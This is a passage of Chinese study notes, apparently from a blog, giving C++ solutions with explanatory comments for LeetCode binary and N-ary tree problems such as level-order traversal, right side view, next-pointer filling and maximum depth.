<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//递归法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">order</span><span class="params">(TreeNode* cur, vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; result, <span class="keyword">int</span> depth)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (cur == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (result.<span class="built_in">size</span>() == depth) </span><br><span class="line">            result.<span class="built_in">push_back</span>(vector&lt;<span class="keyword">int</span>&gt;());</span><br><span class="line">        result[depth].<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">        <span class="built_in">order</span>(cur-&gt;left, result, depth + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">order</span>(cur-&gt;right, result, depth + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">levelOrder</span>(TreeNode* root) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">        <span class="keyword">int</span> depth = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">order</span>(root, result, depth);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//迭代-队列</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">levelOrder</span>(TreeNode* root) &#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) </span><br><span class="line">            que.<span class="built_in">push</span>(root);</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();<span class="comment">//每层结点个数</span></span><br><span class="line">            vector&lt;<span class="keyword">int</span>&gt; vec;</span><br><span class="line">            <span class="comment">// 这里一定要使用固定大小size，不要使用que.size()，因为que.size是不断变化的</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;<span class="comment">//遍历每层</span></span><br><span class="line">                TreeNode* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                vec.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">                <span class="comment">//每遍历一个结点，将其左右子树入队</span></span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            result.<span class="built_in">push_back</span>(vec);<span class="comment">//将一层结点装入 res中</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="107-二叉树的层序遍历-II"><a href="#107-二叉树的层序遍历-II" class="headerlink" title="107 二叉树的层序遍历 II"></a>107 二叉树的层序遍历 II</h3><p><img src="https://img-blog.csdnimg.cn/a19d8a1862c942d2af5348cd81fa5e6f.png"><br>反转上一题的结果即可</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">levelOrderBottom</span>(TreeNode* root) &#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) que.<span class="built_in">push</span>(root);</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();</span><br><span class="line">            vector&lt;<span class="keyword">int</span>&gt; vec;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                vec.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            result.<span class="built_in">push_back</span>(vec);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(result.<span class="built_in">begin</span>(), result.<span class="built_in">end</span>()); <span class="comment">//在这里反转一下数组即可</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="199-二叉树的右视图"><a href="#199-二叉树的右视图" class="headerlink" title="199 二叉树的右视图"></a>199 二叉树的右视图</h3><p>给定一个二叉树的 根节点 root，想象自己站在它的右侧，按照从顶部到底部的顺序，返回从右侧所能看到的节点值。<br><img src="https://img-blog.csdnimg.cn/b6a1b6fb43b54267a1231af84c6bd586.png"><br>层序遍历的时候，判断是否遍历到<strong>单层的最后面的元素</strong>，如果是，就放进result数组中，随后返回result就可以了。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">rightSideView</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) que.<span class="built_in">push</span>(root);</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (i == (size<span class="number">-1</span>))<span class="comment">//处理单层最后一个元素</span></span><br><span class="line">                    result.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="637-二叉树的层平均值"><a href="#637-二叉树的层平均值" class="headerlink" title="637 二叉树的层平均值"></a>637 二叉树的层平均值</h3><p>给定一个非空二叉树的根节点 root , 以数组的形式返回每一层节点的平均值。与实际答案相差 10-5 以内的答案可以被接受。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">double</span>&gt; <span class="title">averageOfLevels</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) </span><br><span class="line">            que.<span class="built_in">push</span>(root);</span><br><span class="line">        vector&lt;<span class="keyword">double</span>&gt; result;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">double</span> sum = <span class="number">0</span>;<span class="comment">//记录 每层的 和sum</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                sum += node-&gt;val;<span class="comment">//sum</span></span><br><span class="line">                <span class="keyword">if</span> (i == (size<span class="number">-1</span>))<span class="comment">//最后时，求平均值装入</span></span><br><span class="line">                    result.<span class="built_in">push_back</span>(sum/size);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="429-N-叉树的层序遍历"><a href="#429-N-叉树的层序遍历" class="headerlink" title="429 N 叉树的层序遍历"></a>429 N 叉树的层序遍历</h3><p>给定一个 N 叉树，返回其节点值的层序遍历。（即从左到右，逐层遍历）。<br>树的序列化输入是用层序遍历，每组子节点都由 null 值分隔（参见示例）。<br><strong>区别：多个孩子加入队列</strong> vector&lt;Node*&gt; children;</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">class Node &#123;</span></span><br><span class="line"><span class="comment">public:</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    vector&lt;Node*&gt; children;//注意！！！！！</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Node() &#123;&#125;</span></span><br><span class="line"><span class="comment">    Node(int _val) &#123;</span></span><br><span class="line"><span class="comment">        val = _val;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    Node(int _val, vector&lt;Node*&gt; _children) &#123;</span></span><br><span class="line"><span class="comment">        val = _val;</span></span><br><span class="line"><span class="comment">        children = _children;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">levelOrder</span>(Node* root) &#123;</span><br><span class="line">        queue&lt;Node*&gt; que;</span><br><span class="line">        <span class="keyword">if</span>(root)</span><br><span class="line">            que.<span class="built_in">push</span>(root);</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">while</span>(!que.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();<span class="comment">//本层 结点个数</span></span><br><span class="line">            vector&lt;<span class="keyword">int</span>&gt; vec;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line">                Node *node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                vec.<span class="built_in">push_back</span>(node-&gt;val);<span class="comment">//装入</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;node-&gt;children.<span class="built_in">size</span>();i++)&#123;<span class="comment">//将本结点 所有孩子入队</span></span><br><span class="line">                    <span class="keyword">if</span>(node-&gt;children[i])</span><br><span class="line">                        que.<span class="built_in">push</span>(node-&gt;children[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="built_in">push_back</span>(vec);<span class="comment">//装入</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="590-N-叉树的后序遍历"><a href="#590-N-叉树的后序遍历" class="headerlink" title="590 N 叉树的后序遍历"></a>590 N 叉树的后序遍历</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment">    O(m)，其中 m 为 N 叉树的节点</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">preorder_N</span><span class="params">(Node *root,vector&lt;<span class="keyword">int</span>&gt;&amp; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;root-&gt;children.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root-&gt;children[i])</span><br><span class="line">                <span class="built_in">preorder_N</span>(root-&gt;children[i],res);<span class="comment">//孩子</span></span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="built_in">push_back</span>(root-&gt;val);<span class="comment">//根</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">postorder</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="built_in">preorder_N</span>(root,res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt;&amp; <span class="title">postorder</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!root) <span class="keyword">return</span> ans;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">const</span> <span class="keyword">auto</span>&amp; c : root-&gt;children) </span><br><span class="line">            <span class="built_in">postorder</span>(c);</span><br><span class="line">        ans.<span class="built_in">emplace_back</span>(root-&gt;val);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="589-N-叉树的前序遍历"><a href="#589-N-叉树的前序遍历" class="headerlink" title="589 N 叉树的前序遍历"></a>589 N 叉树的前序遍历</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">preorder_N</span><span class="params">(Node* root, vector&lt;<span class="keyword">int</span>&gt;&amp; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        res.<span class="built_in">push_back</span>(root-&gt;val);<span class="comment">//根</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;root-&gt;children.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root-&gt;children[i])&#123;</span><br><span class="line">                <span class="built_in">preorder_N</span>(root-&gt;children[i],res);<span class="comment">//孩子</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">preorder</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="built_in">preorder_N</span>(root,res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//迭代</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">preorder</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        stack&lt;Node *&gt; st;</span><br><span class="line">        st.<span class="built_in">emplace</span>(root);</span><br><span class="line">        <span class="keyword">while</span>(!st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            Node * node = st.<span class="built_in">top</span>();</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            res.<span class="built_in">emplace_back</span>(node-&gt;val);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> it = node-&gt;children.<span class="built_in">rbegin</span>(); it != node-&gt;children.<span class="built_in">rend</span>(); it++) &#123;</span><br><span class="line">                st.<span class="built_in">emplace</span>(*it);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="515-在每个树行中找最大值"><a href="#515-在每个树行中找最大值" class="headerlink" title="515 在每个树行中找最大值"></a>515 在每个树行中找最大值</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    在每次弹出时求 直接更新最大值</span></span><br><span class="line"><span class="comment">    也可以 写个函数求最大值</span></span><br><span class="line"><span class="comment">    INT_MAX表示正无穷   INT_MIN表示负无穷 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">largestValues</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) que.<span class="built_in">push</span>(root);</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">int</span> maxValue = INT_MIN; <span class="comment">//取每一层的最大值</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                maxValue = node-&gt;val&gt;maxValue?node-&gt;val:maxValue;</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            result.<span class="built_in">push_back</span>(maxValue); <span class="comment">//把最大值放进数组</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="116-填充每个节点的下一个右侧节点指针"><a href="#116-填充每个节点的下一个右侧节点指针" class="headerlink" title="116 填充每个节点的下一个右侧节点指针"></a>116 填充每个节点的下一个右侧节点指针</h3><p>给定一个 完美二叉树 ，其所有叶子节点都在同一层，每个父节点都有两个子节点。二叉树定义如下：</p>
<pre><code>struct Node &#123;
int val;
Node *left;
Node *right;
Node *next;
&#125;
</code></pre>
<p>填充它的每个 next 指针，让这个指针【指向其下一个右侧节点】<br>【层序遍历】如果找不到下一个右侧节点，则将 next 指针设置为 NULL。<br>初始状态下，所有 next 指针都被设置为 NULL。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//层序遍历</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">Node* <span class="title">connect</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;Node*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) que.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();</span><br><span class="line">            Node* nodePre;<span class="comment">//注意：前驱结点</span></span><br><span class="line">            Node* node;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;<span class="comment">//遍历每层</span></span><br><span class="line">                <span class="keyword">if</span> (i==<span class="number">0</span>) &#123;<span class="comment">//第一个结点：根结点</span></span><br><span class="line">                    nodePre = que.<span class="built_in">front</span>(); <span class="comment">// 取出一层的头结点</span></span><br><span class="line">                    que.<span class="built_in">pop</span>();</span><br><span class="line">                    node = nodePre;<span class="comment">//注意：一定得给node赋值</span></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    node = que.<span class="built_in">front</span>();</span><br><span class="line">                    que.<span class="built_in">pop</span>();</span><br><span class="line">                    nodePre-&gt;next = node; <span class="comment">//本层前一个节点next指向本节点</span></span><br><span class="line">                    nodePre = nodePre-&gt;next;<span class="comment">//更新nodePre</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            nodePre-&gt;next = <span class="literal">NULL</span>; <span class="comment">//本层最后一个节点指向NULL</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="104-二叉树的最大深度"><a href="#104-二叉树的最大深度" class="headerlink" title="104 二叉树的最大深度"></a>104 二叉树的最大深度</h3><p>给定一个二叉树，找出其最大深度。</p>
<ul>
<li><strong>二叉树的深度</strong>: 【根节点】到【最远叶子节点】的最长路径上的节点数。</li>
<li><strong>二叉树节点的深度</strong>：指从【根节点】到【该节点】的最长简单路径边的条数或者节点数（取决于深度从0开始还是从1开始）</li>
<li><strong>二叉树节点的高度</strong>：指从【该节点】到【叶子节点】的最长简单路径边的条数或者节点数（取决于高度从0开始还是从1开始）</li>
</ul>
<p><strong>【根节点的高度】就是【二叉树的最大深度】</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    深度优先搜索【根节点的高度】</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">maxDepth</span>(root-&gt;left),<span class="built_in">maxDepth</span>(root-&gt;right))+<span class="number">1</span>;<span class="comment">//可以直接return </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    int leftdepth = getdepth(node-&gt;left); //左子树深度</span></span><br><span class="line"><span class="comment">    int rightdepth = getdepth(node-&gt;right); //右子树深度</span></span><br><span class="line"><span class="comment">    int depth = 1 + max(leftdepth, rightdepth); //结点深度</span></span><br><span class="line"><span class="comment">    return depth;   </span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//深度优先遍历：分开写，便于理解</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left == <span class="literal">nullptr</span> &amp;&amp; root-&gt;right == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> max_depth = INT_MIN;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            max_depth = <span class="built_in">max</span>(<span class="built_in">maxDepth</span>(root-&gt;left), max_depth);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;right != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            max_depth = <span class="built_in">max</span>(<span class="built_in">maxDepth</span>(root-&gt;right), max_depth);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max_depth + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    广度优先遍历：队列</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) </span><br><span class="line">            que.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">int</span> depth = <span class="number">0</span>;<span class="comment">//记录深度</span></span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();<span class="comment">//该层个数</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode *node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            depth++;<span class="comment">//遍历一层，depth++</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> depth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="559-N-叉树的最大深度"><a href="#559-N-叉树的最大深度" class="headerlink" title="559 N 叉树的最大深度"></a>559 N 叉树的最大深度</h3><p>给定一个 N 叉树，找到其最大深度。<br>最大深度是指从根节点到最远叶子节点的最长路径上的节点总数。<br>N 叉树输入按层序遍历序列化表示，每组子节点由空值分隔（请参见示例）。</p>
